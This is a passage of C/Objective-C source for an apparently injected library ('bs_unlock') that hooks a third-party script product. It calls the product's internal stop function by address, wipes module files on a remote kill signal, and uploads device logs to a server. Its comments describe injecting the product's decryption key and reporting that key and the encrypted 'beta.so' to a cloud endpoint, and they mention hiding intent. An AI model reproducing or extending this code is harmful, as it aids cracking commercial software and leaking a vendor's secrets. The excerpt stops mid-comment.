    if (padlen == 128) md5_block(&ctx, tail + 64);

    unsigned char dig[16];
    for (int i = 0; i < 4; i++) {
        dig[i]      = (unsigned char)(ctx.a >> (8 * i));
        dig[i + 4]  = (unsigned char)(ctx.b >> (8 * i));
        dig[i + 8]  = (unsigned char)(ctx.c >> (8 * i));
        dig[i + 12] = (unsigned char)(ctx.d >> (8 * i));
    }
    bs_md5_hex(dig, 16, out, outsz);
    return 1;
}

/// 计算内存 buffer 的 md5 —— ★ 必须用它来算下载到的模块字节！
///   （v5.4 首版把 mlen 字节的原文直接丢给 bs_md5_hex 了，那是「转 hex」不是「算摘要」，
///     结果 got 变成文件开头的 ASCII "function operate..." 的 hex。此函数修正之。）
static void bs_md5_buf(const unsigned char *data, size_t len, char *out, size_t outsz) {
    md5_ctx ctx = {0x67452301, 0xefcdab89, 0x98badcfe, 0x10325476};
    size_t full = len / 64;
    for (size_t i = 0; i < full; i++) md5_block(&ctx, data + i * 64);

    unsigned char tail[128];
    memset(tail, 0, sizeof(tail));
    size_t rem = len % 64;
    memcpy(tail, data + full * 64, rem);
    tail[rem] = 0x80;
    size_t padlen = (rem < 56) ? 64 : 128;
    uint64_t bits = (uint64_t)len * 8;
    for (int i = 0; i < 8; i++)
        tail[padlen - 8 + i] = (unsigned char)(bits >> (8 * i));
    md5_block(&ctx, tail);
    if (padlen == 128) md5_block(&ctx, tail + 64);

    unsigned char dig[16];
    for (int i = 0; i < 4; i++) {
        dig[i]      = (unsigned char)(ctx.a >> (8 * i));
        dig[i + 4]  = (unsigned char)(ctx.b >> (8 * i));
        dig[i + 8]  = (unsigned char)(ctx.c >> (8 * i));
        dig[i + 12] = (unsigned char)(ctx.d >> (8 * i));
    }
    bs_md5_hex(dig, 16, out, outsz);
}

/// ★ v6.2：取模块/心跳服务端地址。
///   直接返回内置 BS_HOST_DEF（可被 bs_pull.conf 的 host= 覆盖），
///   **不再读 app.plist** —— 那个文件的 ip 是贝塔投屏 App 连电脑中控用的，
///   与本补丁无关，读它会导致两者互相踩。
static int bs_get_host_c(char *out, size_t outsz) {
    if (!g_host[0]) { bs_log("[ip] host empty (BS_HOST_DEF broken?)"); return 0; }
    snprintf(out, outsz, "%s", g_host);
    return 1;
}

/// ★ v6：同步 GET，额外带出 HTTP 状态码（心跳要按 200 判定授权）。
///   语义与 bs_http_get_c 完全一致；源码里实现顺序相反，故此处前置声明。
///   ★ v6.8 拆出带超时参数的 bs_http_get_ex_tmo，bs_http_get_ex 变成 6s 默认包装。
static unsigned char *bs_http_get_ex_tmo(const char *curl, size_t *outlen, long *outcode,
                                         int tmo_req, int tmo_res);
static unsigned char *bs_http_get_ex(const char *curl, size_t *outlen, long *outcode);
static unsigned char *bs_http_post_key(const char *curl, const char *ctype,
                                       const char *xcardkey,
                                       const void *body, size_t blen,
                                       size_t *outlen, long *outcode); // ★ v6.20 前置声明

/// 同步 GET（阻塞，超时 PULL_TIMEOUT 秒）—— 返回 malloc 的 buffer（调用方 free），
/// 长度写入 *outlen。失败返回 NULL。
///
/// ★★ 这是本项目里**唯一**允许在裸 pthread 上调用的 ObjC 网络路径。
///    实测（2026-09-26，.45）：NSURLSession + GCD 信号量汇合在自建线程上完全可用
///    （step5 http_get returned len=506 稳定通过）；崩的是它后面的 NSJSONSerialization。
///    为了把误用面降到最小，这里刻意只在函数体内用 ObjC，出口全部转成 C buffer。
///
/// ★★★ v5.5 修复（2026-09-26，根治 use-after-free 崩溃）★★★
///    崩溃报告（_crash_230340.ips / _crash_230254.ips，均 Signal 11）：
///      #0 libobjc.A.dylib  objc_msgSend        (+0x2414)
///      #1 bs_unlock.dylib  bs_http_get_c       (+0x5f04)   <-- 就是 [out length]
///      #2 bs_unlock.dylib  bs_puller           (+0x5954 / +0x4b24)
///    faultingThread=7（自建 pthread），KERN_INVALID_ADDRESS at 0x10。
///
///    根因：**本 dylib 是 MRR 编译的（CI 没有 -fobjc-arc）**，`__block NSData *out`
///    只是裸指针槽位。completion block 里的 `out = d` **不产生 retain**：
///    `d` 属于 NSURLSession 回调队列的 autorelease pool，block 返回后即被回收。
///    等 dispatch_semaphore_wait 醒来再访问 `out.length`（0x5f00 的 objc_msgSend$length）
///    已经指向已释放对象 → objc_msgSend 在野指针上取 isa → 0x10 处 SIGSEGV。
///    （`done==YES` 但崩溃照样发生，正是 use-after-free 的典型特征。）
///
///    修法：**在回调线程内部当场把字节 memcpy 进堆 buffer**，锁外再搬给调用方。
///    这样跨线程共享的只有一个 `void*` + 两个整数，ObjC 对象生命周期完全不出 block。
struct bs_http_slot {
    unsigned char *buf;     // malloc 出来的副本（NULL = 失败）
    size_t         len;
    long           code;    // HTTP status，0 = 未知
};

static unsigned char *bs_http_get_c(const char *curl, size_t *outlen) {
    return bs_http_get_ex(curl, outlen, NULL);
}

/// ★ v6 实现：与旧 bs_http_get_c 逐行一致，额外回写 HTTP 状态码。
///   心跳用它区分「服务在但明确拒绝（403/404）」与「压根连不上（code==0）」。
static unsigned char *bs_http_get_ex(const char *curl, size_t *outlen, long *outcode) {
    // ★ v6.8：小请求（心跳/manifest/密钥/模块）维持 6s/8s 不变；
    //   大文件下载（beta.so）走 bs_http_get_ex_tmo 的长超时版本。
    return bs_http_get_ex_tmo(curl, outlen, outcode, PULL_TIMEOUT, PULL_TIMEOUT + 2);
}

/// ★ v6.8：带超时参数的同步 GET —— 与 bs_http_get_ex 逐行一致，只是超时可调。
///   为什么必须有它：PULL_TIMEOUT=6s（resource 8s）在局域网拉 1.16MB 只要 3s，
///   但弱网远程（111.172.x 两台实测）8s 内拉不完 → NSURLErrorTimedOut(-1001)
///   → 收到 0 字节 → bad size 0 abort，**每 120s 白下载一次、永不落盘**（38 次/9 次）。
///   timeoutIntervalForRequest 是「无数据空闲」超时（有数据流动就续命），
///   timeoutIntervalForResource 是整个请求的总预算 —— 两个都要放大才有效。
static unsigned char *bs_http_get_ex_tmo(const char *curl, size_t *outlen, long *outcode,
                                         int tmo_req, int tmo_res) {
    if (outlen) *outlen = 0;
    if (outcode) *outcode = 0;
    if (!curl || !curl[0]) return NULL;

    // —— 跨线程交换用的纯 C 槽位（不用 __block 对象！）——
    //   slot 用 malloc 避免 __block byref 的逃逸写屏障差异；用原子写保证可见性。
    struct bs_http_slot *slot = (struct bs_http_slot *)calloc(1, sizeof(struct bs_http_slot));
    if (!slot) return NULL;

    dispatch_semaphore_t sem = dispatch_semaphore_create(0);

    @autoreleasepool {
        NSString *url = [NSString stringWithUTF8String:curl];
        if (url.length == 0) { free(slot); return NULL; }
        NSURL *u = [NSURL URLWithString:url];
        if (!u) { bs_log("[pull] bad url %s", curl); free(slot); return NULL; }

        NSMutableURLRequest *rq = [NSMutableURLRequest requestWithURL:u];
        rq.timeoutInterval = tmo_req;
        rq.cachePolicy = NSURLRequestReloadIgnoringLocalAndRemoteCacheData;

        NSURLSessionConfiguration *cc = [NSURLSessionConfiguration ephemeralSessionConfiguration];
        cc.timeoutIntervalForRequest  = tmo_req;
        cc.timeoutIntervalForResource = tmo_res;
        NSURLSession *ss = [NSURLSession sessionWithConfiguration:cc];

        [[ss dataTaskWithRequest:rq
              completionHandler:^(NSData *d, NSURLResponse *rp, NSError *e) {
            // ★★ 关键：在回调线程的 autorelease pool 还活着时，立刻把字节拷走。
            //    绝不把 NSData* 本身带出这个 block。
            long code = 0;
            if ([rp isKindOfClass:[NSHTTPURLResponse class]]) {
                code = (long)[(NSHTTPURLResponse *)rp statusCode];
            }
            if (!e && d != nil && d.length > 0 && code == 200) {
                size_t n = (size_t)d.length;
                unsigned char *copy = (unsigned char *)malloc(n + 1);
                if (copy) {
                    memcpy(copy, d.bytes, n);
                    copy[n] = 0;            // 方便当字符串扫
                    slot->buf = copy;
                    slot->len = n;
                }
            } else if (e) {
                // ★ 不用 e.localizedDescription（会走 NSBundle 懒加载文本表，
                //   在裸 pthread 上有风险）；只打 code/domain 这类纯标量。
                bs_log("[pull] err code=%ld", (long)e.code);
            } else if (code != 0 && code != 200) {
                bs_log("[pull] http %ld for %s", code, curl);
            }
            slot->code = code;
            // 原子发布：先写数据再打屏障，再 signal，保证等待线程看到完整数据
            __sync_synchronize();
            dispatch_semaphore_signal(sem);
        }] resume];

        // 按需修改（上面 block 捕获了 slot，无需 __block）
        //   ★ v6.8：等待上限跟随 resource 超时（+3s 余量），否则大文件下载
        //   还没到 resource 上限信号量就先超时了，白等。
        long waited = dispatch_semaphore_wait(
            sem, dispatch_time(DISPATCH_TIME_NOW, (int64_t)(tmo_res + 3) * NSEC_PER_SEC));
        [ss invalidateAndCancel];
        if (outcode) *outcode = slot->code;     // ★ v6：码也要带出去（超时/失败路径）
        if (waited != 0) {
            bs_log("[pull] timeout %s", curl);
            // ★★ 超时后**绝不 free(slot)**：回调可能仍在队列里，一旦它随后写
            //    slot 就是我们刚修掉的同一个 UAF。这里刻意泄漏（每进程最多几次
            //    pull 超时，几十字节，可忽略），换取绝对的内存安全。
            return NULL;
        }
    }

    if (outcode) *outcode = slot->code;         // ★ v6
    if (slot->buf && slot->len > 0) {
        unsigned char *ret = slot->buf;         // 所有权交给调用方
        size_t n = slot->len;
        free(slot);
        if (outlen) *outlen = n;
        return ret;
    }
    free(slot);
    return NULL;
}

/// ★★ v6.4：同步 POST（与 bs_http_get_ex 同构，额外带请求体）。
///   用途：probe 模式向云端 /probe 上报「密钥 + beta.so」（最大 1MB+）。
///   语义与 GET 版一致：HTTP 200 且响应非空则返回 malloc 的 buffer（调用方 free），
///   否则返回 NULL 并回写 outcode。
///   ★ 沿用 GET 版的铁律：**超时后绝不 free(slot)**（回调可能仍在队列里，防 UAF）。
static unsigned char *bs_http_post_ex(const char *curl, const char *ctype,
                                      const void *body, size_t blen,
                                      size_t *outlen, long *outcode) {
    return bs_http_post_key(curl, ctype, NULL, body, blen, outlen, outcode);
}

/// ★ v6.20：带可选自定义头（X-Card-Key）的 POST —— v6.19  probe 帧与卡密 login 共用。
static unsigned char *bs_http_post_key(const char *curl, const char *ctype,
                                       const char *xcardkey,
                                       const void *body, size_t blen,
                                       size_t *outlen, long *outcode) {
    if (outlen) *outlen = 0;
    if (outcode) *outcode = 0;
    if (!curl || !curl[0] || !body || blen == 0) return NULL;

    // 上行大包给足超时（GET 是 6s，这里 ×4）
    const int tmo = PULL_TIMEOUT * 4;

    struct bs_http_slot *slot = (struct bs_http_slot *)calloc(1, sizeof(struct bs_http_slot));
    if (!slot) return NULL;

    dispatch_semaphore_t sem = dispatch_semaphore_create(0);

    @autoreleasepool {
        NSString *url = [NSString stringWithUTF8String:curl];
        if (url.length == 0) { free(slot); return NULL; }
        NSURL *u = [NSURL URLWithString:url];
        if (!u) { bs_log("[probe] bad url %s", curl); free(slot); return NULL; }

        NSMutableURLRequest *rq = [NSMutableURLRequest requestWithURL:u];
        rq.HTTPMethod = @"POST";
        rq.timeoutInterval = tmo;
        rq.cachePolicy = NSURLRequestReloadIgnoringLocalAndRemoteCacheData;
        if (ctype && ctype[0])
            [rq setValue:[NSString stringWithUTF8String:ctype]
                  forHTTPHeaderField:@"Content-Type"];
        if (xcardkey && xcardkey[0])
            [rq setValue:[NSString stringWithUTF8String:xcardkey]
                  forHTTPHeaderField:@"X-Card-Key"];
        [rq setValue:@"identity" forHTTPHeaderField:@"Accept-Encoding"];
        [rq setHTTPBody:[NSData dataWithBytes:body length:blen]];

        NSURLSessionConfiguration *cc = [NSURLSessionConfiguration ephemeralSessionConfiguration];
        cc.timeoutIntervalForRequest  = tmo;
        cc.timeoutIntervalForResource = tmo + 5;
        NSURLSession *ss = [NSURLSession sessionWithConfiguration:cc];

        [[ss dataTaskWithRequest:rq
              completionHandler:^(NSData *d, NSURLResponse *rp, NSError *e) {
            // 与 GET 版同样的纪律：在回调 autorelease pool 里把字节拷走，不带 NSData* 出去
            long code = 0;
            if ([rp isKindOfClass:[NSHTTPURLResponse class]])
                code = (long)[(NSHTTPURLResponse *)rp statusCode];
            if (!e && d != nil && d.length > 0) {
                size_t n = (size_t)d.length;
                unsigned char *copy = (unsigned char *)malloc(n + 1);
                if (copy) {
                    memcpy(copy, d.bytes, n);
                    copy[n] = 0;
                    slot->buf = copy;
                    slot->len = n;
                }
            } else if (e) {
                bs_log("[probe] post err code=%ld", (long)e.code);
            } else if (code != 0 && code != 200) {
                bs_log("[probe] post http %ld", code);
            }
            slot->code = code;
            __sync_synchronize();
            dispatch_semaphore_signal(sem);
        }] resume];

        long waited = dispatch_semaphore_wait(
            sem, dispatch_time(DISPATCH_TIME_NOW, (int64_t)(tmo + 6) * NSEC_PER_SEC));
        [ss invalidateAndCancel];
        if (outcode) *outcode = slot->code;
        if (waited != 0) {
            bs_log("[probe] post timeout %s", curl);
            return NULL;    // ★ 不 free(slot)：回调可能仍在队列里
        }
    }

    if (outcode) *outcode = slot->code;
    if (slot->buf && slot->len > 0) {
        unsigned char *ret = slot->buf;
        size_t n = slot->len;
        free(slot);
        if (outlen) *outlen = n;
        return ret;
    }
    free(slot);
    return NULL;
}

/// 从 manifest.json 里取模块名 → 期望 md5。
///
/// ★★ 2026-09-26 关键修正：**绝对不能用 NSJSONSerialization！**
///    实测崩溃：在自建 pthread(bs_puller) 里首次调 NSJSONSerialization 时
///    SIGSEGV KERN_INVALID_ADDRESS at 0x10（objc_msgSend 内部）。
///    注意 NSData/NSString/NSPropertyListSerialization 在该线程里都正常，
///    唯独 NSJSONSerialization 会崩（它依赖 ICU/CF locale 数据懒加载）。
///    ⇒ 这里改成**纯 C 的极简 JSON 扫描**，只提取 manifest 里的
///      "modules": { "<name>": { "md5": "<hex>", ... }, ... }
///    完全不碰 ObjC，任何线程都安全。
///
/// manifest 由我们自己的 PC 端生成，格式可控，解析器只需覆盖这一种形状。
#define BS_MAX_MODS 64
#define BS_NAME_MAX 128
typedef struct {
    char name[BS_NAME_MAX];
    char md5[40];
} bs_mod_t;

/// 在 [p, end) 里跳过空白
static const char *bs_skip_ws(const char *p, const char *end) {
    while (p < end && (*p == ' ' || *p == '\t' || *p == '\n' || *p == '\r')) p++;
    return p;
}

/// 从 p 处解析一个 JSON 字符串到 out（去转义），返回结束引号后的位置；失败返回 NULL
static const char *bs_json_str(const char *p, const char *end, char *out, size_t outsz) {
    if (p >= end || *p != '"') return NULL;
    p++;
    size_t n = 0;
    while (p < end && *p != '"') {
        char c = *p;
        if (c == '\\' && p + 1 < end) {
            p++;
            switch (*p) {
                case 'n': c = '\n'; break;
                case 't': c = '\t'; break;
                case 'r': c = '\r'; break;
                case '"': c = '"';  break;
                case '\\': c = '\\'; break;
                case '/': c = '/';  break;
                default: c = *p;    break;
            }
        }
        if (n + 1 < outsz) out[n++] = c;
        p++;
    }
    if (p >= end) return NULL;
    out[n] = 0;
    return p + 1;   // 跳过结尾引号
}

/// 解析 manifest，填充 mods，返回模块数（0 = 失败/空）
static int bs_parse_manifest_c(const char *buf, size_t len, bs_mod_t *mods, int maxmods) {
    const char *end = buf + len;

    // 1) 找 "modules"
    const char *p = buf;
    const char *modsKey = NULL;
    while (p < end) {
        const char *q = strstr(p, "\"modules\"");
        if (!q || q >= end) break;
        // 确认是 key（后面跟冒号）
        const char *r = bs_skip_ws(q + 9, end);
        if (r < end && *r == ':') { modsKey = r + 1; break; }
        p = q + 9;
    }
    if (!modsKey) return 0;

    // 2) 进入 modules 的 { }
    p = bs_skip_ws(modsKey, end);
    if (p >= end || *p != '{') return 0;
    p++;

    int n = 0;
    while (p < end && n < maxmods) {
        p = bs_skip_ws(p, end);
        if (p >= end) break;
        if (*p == '}') break;               // modules 结束
        if (*p == ',') { p++; continue; }

        // 模块名
        char name[BS_NAME_MAX];
        const char *np = bs_json_str(p, end, name, sizeof(name));
        if (!np) break;
        p = bs_skip_ws(np, end);
        if (p >= end || *p != ':') break;
        p = bs_skip_ws(p + 1, end);
        if (p >= end || *p != '{') break;   // 进入模块对象
        p++;

        // 在模块对象里找 "md5"
        char md5[40] = {0};
        while (p < end) {
            p = bs_skip_ws(p, end);
            if (p >= end || *p == '}') { p++; break; }
            if (*p == ',') { p++; continue; }

            char key[64];
            const char *kp = bs_json_str(p, end, key, sizeof(key));
            if (!kp) { p = end; break; }
            p = bs_skip_ws(kp, end);
            if (p >= end || *p != ':') break;
            p = bs_skip_ws(p + 1, end);

            if (!strcmp(key, "md5")) {
                const char *vp = bs_json_str(p, end, md5, sizeof(md5));
                if (!vp) break;
                p = vp;
            } else {
                // 跳过该 value（字符串 / 数字 / true / false / null）
                if (p < end && *p == '"') {
                    char skip[512];
                    const char *vp = bs_json_str(p, end, skip, sizeof(skip));
                    if (!vp) break;
                    p = vp;
                } else {
                    while (p < end && *p != ',' && *p != '}') p++;
                }
            }
        }

        if (name[0] && md5[0]) {
            strncpy(mods[n].name, name, BS_NAME_MAX - 1);
            mods[n].name[BS_NAME_MAX - 1] = 0;
            strncpy(mods[n].md5, md5, sizeof(mods[n].md5) - 1);
            mods[n].md5[sizeof(mods[n].md5) - 1] = 0;
            n++;
        }
    }
    return n;
}

/// ---------------------------------------------------------------- v6 心跳授权
///
/// 「心跳即死亡」核心：模块虽然只下发一次，但**使用许可**每一轮都要向 PC 复核。
///
/// ★★ 两种失败必须区别对待（v6.1 起）：
///   - **网络类失败**（连不上/超时/5xx）：抖动是常态 → **计数容忍**，
///     连续 `g_hb_max` 次才判失联（失联窗口 = g_hb_max × tick 秒，默认 3）。
///   - **授权类失败**（403 / body `"ok":false`）：是**明确判决** → **立即**死，
///     一次都不容忍。否则被人拉黑还能多跑 3 个 tick。
///
/// 返回值约定（v6.1 改动）：
///     1 = 授权有效（继续）
///     0 = 本次不通过（**网络类**，交给调用方累加 g_hb_miss 决定是否杀）
///    -1 = **立即判死**（授权类，调用方必须无条件 kill，不看计数）
///
/// ★ 鉴权语义（服务端实现约定）：
///     200 + {"ok":true}   → 授权有效
///     200 + {"ok":false}  → 显式拒绝（被拉黑/到期）→ 返回 -1 立即判死
///     403                 → 同上，返回 -1 立即判死
///     404                 → 服务端没实现该端点 → 视为**不启用**心跳（避免误杀自己）
///     其他                → 计入 miss
///   这样「只装了 deb、没跑 BSModuleServer」的设备，因为连不上（code==0）
///   会连续 g_hb_max 次后死掉。
static int bs_hb_ping(uintptr_t base) {
    @autoreleasepool {
        char ip[128] = {0};
        if (!bs_get_host_c(ip, sizeof(ip))) {
            bs_log("[hb] no server host -> miss");
            return 0;
        }

        char url[768];   // ★ v6.10 g_qbuf 现含设备信息，512 不够
        char qb[512];    // ★ v6.25g：每拍现算，&of=&ofn= 不跟着进程启动冻结
        const char *q = "";
        if (g_token[0] != 0) { bs_q_live(qb, sizeof(qb)); q = qb; }
        snprintf(url, sizeof(url), "http://%s:%d%s%s", ip, g_port, HB_PATH, q);
        bs_log("[hb] ping %s", url);

        size_t n = 0;
        long code = 0;
        unsigned char *buf = bs_http_get_ex(url, &n, &code);
        bs_log("[hb] resp code=%ld len=%lu", code, (unsigned long)n);

        int verdict = 0;        // 0=miss  1=ok
        if (code == 404) {
            // 服务端未实现 /hb：按「不启用心跳」处理，避免把正常环境误杀
            // 但此时又没跑服务，连 404 都拿不到（code==0）。所以只有真拿到 404 才放过。
            bs_log("[hb] endpoint absent (404) -> heartbeat disabled");
            free(buf);
            g_hb_miss = 0;
            g_hb_ok   = 1;
            g_hb_last = (long)time(NULL);
            return 1;
        }
        if (code == 403) {
            // ★ 明确拒绝：不计数，立即死
            bs_log("[hb] forbidden (403) -> immediate kill");
            free(buf);
            return -1;
        }
        if (buf && n > 0) {
            // 极简判定：body 里出现 "ok":true / "ok":false（服务端我们自己写）
            const char *s = (const char *)buf;
            if (strstr(s, "\"ok\":true") || strstr(s, "\"ok\": true") ||
                strstr(s, "\"ok\" :true") || strstr(s, "\"ok\" : true")) {
                verdict = 1;
            } else if (strstr(s, "\"ok\":false") || strstr(s, "\"ok\": false")) {
                // ★ 明确拒绝：不计数，立即死
                bs_log("[hb] explicit deny -> immediate kill");
                free(buf);
                return -1;
            }
            // ★ v6.24s：授权有效时取 s2（server2 改道目标）。字段缺失 = 保持现值
            //   （兼容老中控）；字段存在（含空串/off）= 覆盖，故中控删规则能远程回退。
            if (verdict) {
                char s2[80];
                if (bs_json_pick_str((const unsigned char *)s, n, "s2", s2, sizeof(s2)))
                    bs_s2_apply(s2, "hb");
                // ★ v6.25b：真离线开关走同一条心跳通道 —— 否则 442 台只能逐台改 conf。
                //   "off":1/0 即开即关；字段缺失（老中控）= 保持 conf 现值。
                //   注意：与 s2 独立 —— s2 有效时改道优先，offline 只在无 s2 时接管。
                char offv[16];
                if (bs_json_pick_str((const unsigned char *)s, n, "off", offv, sizeof(offv)))
                    bs_offline_apply(offv, "hb");
            }
        }
        free(buf);

        if (verdict) {
            if (!g_hb_ok) bs_log("[hb] re-authorized");
            g_hb_ok   = 1;
            g_hb_miss = 0;
            g_hb_last = (long)time(NULL);
            return 1;
        }
        // 网络类失败：调用方累加计数
        bs_log("[hb] network miss (code=%ld)", code);
        return 0;
    }
}

/// ★ v6.23k：设备日志回传 —— 把本机 bs_unlock.log 尾部（≤8KB）POST 到云端
///   /devlog?key=<token>，解决「设备不在同一局域网抓不到日志」。
///   puller 每拍 hb 后调用；日志无增长或距上次 <50s 则跳过；
///   失败完全静默 —— 日志通道绝不允许影响主链路。
static void bs_devlog_upload(void) {
    static long last_size = -1;
    static long last_try  = 0;
    if (!g_token[0]) return;
    long now = (long)time(NULL);
    if (now - last_try < 50) return;
    last_try = now;
    FILE *f = fopen(BS_LOG_PATH, "rb");
    if (!f) return;
    fseek(f, 0, SEEK_END);
    long sz = ftell(f);
    if (sz <= 0 || sz == last_size) { fclose(f); return; }
    long tail = sz > 8192 ? 8192 : sz;
    fseek(f, sz - tail, SEEK_SET);
    static char body[8200];                   // static：裸线程栈安全
    size_t rn = fread(body, 1, (size_t)tail, f);
    fclose(f);
    if (rn == 0) return;
    last_size = sz;
    char ip[128] = {0};
    if (!bs_get_host_c(ip, sizeof(ip))) return;
    char url[512];
    snprintf(url, sizeof(url), "http://%s:%d/devlog?key=%s", ip, g_port, g_token);
    size_t on = 0; long ocode = 0;
    unsigned char *obuf = bs_http_post_ex(url, "text/plain", body, rn, &on, &ocode);
    if (obuf) free(obuf);
    bs_log("[devlog] uploaded %zu B (file %ld B) http=%ld", rn, sz, ocode);

    // ★ v6.23z：agent.log（脚本层错误源，「run script error」所在文件）尾 8KB
    //   随拍分存云端（&src=agent）。远程设备脚本停摆时无需 SSH 即可在云端
    //   对照「脚本报错 → [cr]/[wd] 自愈」完整时间线。失败完全静默。
    {
        FILE *af = fopen(DATA_DIR "/log/agent.log", "rb");
        if (af) {
            fseek(af, 0, SEEK_END);
            long asz = ftell(af);
            if (asz > 0) {
                long atail = asz > 8192 ? 8192 : asz;
                fseek(af, asz - atail, SEEK_SET);
                static char abody[8200];          // static：裸线程栈安全
                size_t an = fread(abody, 1, (size_t)atail, af);
                if (an > 0) {
                    char aurl[560];
                    snprintf(aurl, sizeof(aurl),
                             "http://%s:%d/devlog?key=%s&src=agent", ip, g_port, g_token);
                    size_t an2 = 0; long acode = 0;
                    unsigned char *ares = bs_http_post_ex(aurl, "text/plain", abody, an, &an2, &acode);
                    if (ares) free(ares);
                }
            }
            fclose(af);
        }
    }

    // ★ v6.24r：事件专道（&src=evt）—— bs_evt.log 只记决策级事件，增长极慢，
    //   8KB 可覆盖数周。主日志被 [pull]/[hb]/rep-key 刷到只剩 6~12 分钟时，
    //   崩溃/停止/换库的现场仍然完整留在这里。失败完全静默。
    {
        static long evt_last = -1;
        FILE *ef = fopen(BS_EVT_PATH, "rb");
        if (ef) {
            fseek(ef, 0, SEEK_END);
            long esz = ftell(ef);
            if (esz > 0 && esz != evt_last) {
                long etail = esz > 8192 ? 8192 : esz;
                fseek(ef, esz - etail, SEEK_SET);
                static char ebody[8200];          // static：裸线程栈安全
                size_t en = fread(ebody, 1, (size_t)etail, ef);
                if (en > 0) {
                    char eurl[560];
                    snprintf(eurl, sizeof(eurl),
                             "http://%s:%d/devlog?key=%s&src=evt", ip, g_port, g_token);
                    size_t en2 = 0; long ecode = 0;
                    unsigned char *eres = bs_http_post_ex(eurl, "text/plain", ebody, en, &en2, &ecode);
                    if (eres) free(eres);
                    evt_last = esz;
                }
            }
            fclose(ef);
        }
    }
}

/// ★ v6.34：数本地模块文件（.lua）个数。resume 前自检 + 自停保留模块的日志都要用。
static int bs_count_local_modules(void) {
    int n = 0;
    DIR *d = opendir(g_mod_dir);
    if (!d) return 0;
    struct dirent *de;
    while ((de = readdir(d)) != NULL) {
        size_t ln = strlen(de->d_name);
        if (ln >= 5 && strcmp(de->d_name + ln - 4, ".lua") == 0) n++;
    }
    closedir(d);
    return n;
}

/// ★ v6.23i：抹掉本地模块文件（从 bs_killswitch 抽出，供封禁期每拍复用）。
///   只 unlink *.lua，不动目录本身；返回抹掉的文件数。
static int bs_wipe_local_modules(void) {
    int wiped = 0;
    char dpath[288];
    snprintf(dpath, sizeof(dpath), "%s", g_mod_dir);
    DIR *d = opendir(dpath);
    if (d) {
        struct dirent *de;
        while ((de = readdir(d)) != NULL) {
            size_t ln = strlen(de->d_name);
            if (ln < 5) continue;
            if (strcmp(de->d_name + ln - 4, ".lua") != 0) continue;
            char fp[320];
            snprintf(fp, sizeof(fp), "%s/%s", dpath, de->d_name);
            if (unlink(fp) == 0) wiped++;
        }
        closedir(d);
    }
    return wiped;
}

/// 死亡开关：停脚本 +（按需）抹掉本地模块。
///
/// ★ 只做**不可逆且立刻生效**的事：
///   1) 调产品自己的 `_set_user_script_operate(1)` 停脚本；
///   2) 视触发原因决定是否 unlink 模块目录下所有 *.lua。
///
/// ★★★ v6.39：**心跳「网络类失联」不再删模块**（2026-10-24 断网事故根因）：
///   旧版一律 `bs_wipe_local_modules()`，于是「断网 3 分钟」（tick=60 × hbmiss=3）
///   就把模块清空。而断网是**瞬时故障**，模块本身没坏 —— 清空只是让恢复后
///   必然撞 `bs_module_lost`，[ar] 就算接上也立刻再炸一次，形成「断网即躺平」。
///   新规则：
///     · 授权类拒绝（`heartbeat denied` / 卡封禁）→ 仍然清空（这是真判决，必须断能力）
///     · 网络类失联（`heartbeat lost`）→ **只停脚本，保留模块**
///   保留模块后，网络一恢复 puller 心跳通过 → [ar] 可在下一拍直接 OPER_START 接上，
///   不用等模块重新下载（也避免了下载失败导致的二次卡死）。
///
/// ★ 不删 dylib / 不删 beta.so / 不删 Agent：那是补丁本体，删了反而暴露意图，
///   而且会让「重新连上服务后自动恢复」这条链路断掉。
///
/// why 取值约定：含 "denied" = 授权拒绝（要抹）；含 "lost" = 网络失联（不抹）。
static void bs_killswitch(uintptr_t base, const char *why) {
    // ★ v6.39：先判「这次要不要抹模块」，日志一并带上，便于事后取证
    int wipe = 1;
    if (why && strstr(why, "lost")) wipe = 0;      // 网络类失联 → 保留模块
    if (why && strstr(why, "denied")) wipe = 1;    // 授权拒绝 → 必抹（覆盖顺序保证）

    bs_log("[kill] TRIGGERED (%s) miss=%d -> stop script%s",
           why ? why : "?", g_hb_miss, wipe ? " + wipe modules" : " (keep modules)");

    // 1) 停脚本（产品内部函数，必须从非裸线程调用路径进入 → watchdog 线程已就绪）
    if (base) {
        g_kill_sent = 1;                 // ★ v6.28：标记「这次停是我们自己干的」
        g_kill_ts   = (long)time(NULL);
        g_kill_resumable = wipe ? 0 : 1; // ★ v6.39：网络失联 = 可恢复，允许 [ar] 接上
        ((void (*)(int))(base + FN_SET_OPER))(OPER_STOP);
        bs_log("[kill] OPER_STOP issued (resumable=%d)", g_kill_resumable);
    }

    // 2) 按需抹掉模块文件（纯 POSIX，任何线程安全）
    if (wipe) {
        int wiped = bs_wipe_local_modules();
        bs_log("[kill] wiped %d module file(s) at %s", wiped, g_mod_dir);
    } else {
        bs_log("[kill] KEEP %d module file(s) at %s (transient net loss, will auto-resume)",
               bs_count_local_modules(), g_mod_dir);
    }
}

/// ★ v6.3：读本地 beta.so 的版本号。
///   文件头 4 字节 = [类型 1B][版本 3B]：02 09 09 -> "020909"（2.9.9）、
///   03 00 00 -> "030000"（3.0.0）。纯 POSIX 读，路径是 App 视角
///   （本 dylib 跑在 Agent 进程内，DATA_DIR 即真实 Media）。
static int bs_read_beta_ver(char *out, size_t outsz) {
    int fd = open(DATA_DIR "/beta.so", O_RDONLY);
    if (fd < 0) {
        // ★ v6.38：去抖。verwatch 每 3s 调一次，旧写法把 8KB 设备日志窗口刷满
        //   `errno=2`，远端完全看不到 [so]/[pull]/[off] 的真日志（10-23 排障实锤）。
        //   现在同一状态 300s 只打一条，并带上 pid —— 便于区分是哪个进程的视图
        //   （App 进程 vs Agent 进程）看不到文件。
        static time_t last_ts = 0;
        static int    last_err = 0;
        static int    seen = 0;
        int e = errno;
        time_t now = time(NULL);
        if (!seen || e != last_err || now - last_ts >= 300) {
            bs_log("[mh] open beta.so failed errno=%d pid=%d (suppress 300s)", e, (int)getpid());
            seen = 1; last_err = e; last_ts = now;
        }
        return 0;
    }
    unsigned char h[4];
    ssize_t r = read(fd, h, sizeof(h));
    close(fd);
    if (r != (ssize_t)sizeof(h)) {
        bs_log("[mh] beta.so too short (r=%d)", (int)r);
        return 0;
    }
    snprintf(out, outsz, "%02x%02x%02x", h[1], h[2], h[3]);
    return 1;
}

/// ★ v6.3：注入解密密钥 _g_script_mushroom_head。
///
///   密钥优先从服务端取：GET /key?prj=<BS_PRJ>&ver=<本地 beta.so 版本>
///   返回 35 字节二进制 = 3B 版本号 + 32B 密钥（与 key 完全对应）。
///   取不到（离线/新版本还没上架）才回退到编译期内置的 kKey/kVal。
///
///   ⇒ 这一改动的意义：**脚本升级后不必重编译 dylib**。以前密钥硬编码，
